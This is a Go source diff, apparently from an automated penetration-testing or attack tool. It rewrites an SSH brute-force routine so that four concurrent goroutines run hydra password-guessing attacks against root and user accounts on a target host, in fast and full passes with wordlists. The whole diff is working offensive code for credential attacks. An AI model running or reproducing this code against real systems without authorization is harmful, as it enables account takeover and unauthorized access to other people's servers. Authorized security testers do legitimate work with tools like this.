@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"sync"
 
 	str "strings"
 )
@@ -13,16 +14,83 @@ func (t *targetT) testSsh(port int, portInfo portInfoT) {
 }
 
 func (t *targetT) sshBrute(port int) {
+	sshWg := &sync.WaitGroup{}
+
+	sshWg.Add(2)
+
+	print("brute forcing ssh root (fast)...\n")
+	go t.sshBruteRootFast(t.host, port, sshWg)
+
+	print("brute forcing ssh users (fast)...\n")
+	go t.sshBruteUserFast(t.host, port, sshWg)
+
+	sshWg.Wait()
+
+	sshWg.Add(2)
+
+	print("brute forcing ssh root (full)...\n")
+	go t.sshBruteRootFull(t.host, port, sshWg)
+
+	print("brute forcing ssh users (full)...\n")
+	go t.sshBruteUserFull(t.host, port, sshWg)
+
+	sshWg.Wait()
+
+	t.wg.Done()
+}
+
+func (t *targetT) sshBruteRootFast(host string, port int, wg *sync.WaitGroup) {
 	var c cmdT
-	c.name = "ssh_brute_fast"
+	c.name = "ssh_brute_root_fast"
 	c.bin = "hydra"
 
-	argsS := fmt.Sprintf("-L %s -P %s -u -f ssh://%s:%d -t 32",
-		"/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
-		"/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt",
-		t.host, port)
+	argsS := fmt.Sprintf("-l root -P %s -u ssh://%s:%d -t 16",
+		"./data/ssh_rootpass_fast", t.host, port)
+
 	c.args = str.Split(argsS, " ")
 
 	runCmd(t.host, &c)
-	t.wg.Done()
+	wg.Done()
+}
+
+func (t *targetT) sshBruteUserFast(host string, port int, wg *sync.WaitGroup) {
+	var c cmdT
+	c.name = "ssh_brute_user_fast"
+	c.bin = "hydra"
+
+	argsS := fmt.Sprintf("-L %s -P %s -u ssh://%s:%d -t 16",
+		"./data/ssh_users", "./data/ssh_userpass_fast", t.host, port)
+
+	c.args = str.Split(argsS, " ")
+
+	runCmd(t.host, &c)
+	wg.Done()
+}
+
+func (t *targetT) sshBruteRootFull(host string, port int, wg *sync.WaitGroup) {
+	var c cmdT
+	c.name = "ssh_brute_root_full"
+	c.bin = "hydra"
+
+	argsS := fmt.Sprintf("-l root -P %s -u ssh://%s:%d -t 16",
+		"./data/ssh_rootpass_full", t.host, port)
+
+	c.args = str.Split(argsS, " ")
+
+	runCmd(t.host, &c)
+	wg.Done()
+}
+
+func (t *targetT) sshBruteUserFull(host string, port int, wg *sync.WaitGroup) {
+	var c cmdT
+	c.name = "ssh_brute_user_full"
+	c.bin = "hydra"
+
+	argsS := fmt.Sprintf("-L %s -P %s -u ssh://%s:%d -t 16",
+		"./data/ssh_users", "./data/ssh_userpass_full", t.host, port)
+
+	c.args = str.Split(argsS, " ")
+
+	runCmd(t.host, &c)
+	wg.Done()
 }
